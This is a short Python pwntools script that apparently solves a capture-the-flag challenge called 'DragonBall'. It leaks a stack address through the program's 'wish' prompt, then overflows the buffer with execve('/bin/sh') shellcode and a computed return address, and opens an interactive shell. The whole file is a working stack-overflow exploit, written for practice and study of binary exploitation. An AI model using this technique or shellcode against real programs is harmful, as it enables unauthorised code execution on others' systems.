#/usr/bin/env python
#encoding: utf-8

from pwn import *
io = process('./DragonBall')
context.log_level = 'debug'

#gdb.attach(io, '''
#	break *0x0804876E
#	break *0x08048796
#	continue
#''')

def buy():
	io.recvuntil('choice: ')
	io.sendline('1')

def sell():
	io.recvuntil('choice: ')
	io.sendline('2')
	
def list():
	io.recvuntil('choice: ')
	io.sendline('3')

def wish():
	io.recvuntil('choice: ')
	io.sendline('4')	
	io.recvuntil('wish: ')
	io.sendline(cyclic(0x67))
	data = io.recvuntil(pack(0x08048868), drop = True)[-4:]
	print hex(unpack(data))
	ret = hex(int(unpack(data)) - 0x58)
	print ret
	payload = shellcode + 'a'*(0x3c - len(shellcode)) + pack(int(unpack(data)) - 0x58)
	io.sendline(payload)
	
buy()
sell()
for i in range(7):
	buy()

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

wish()
io.interactive()



	
	
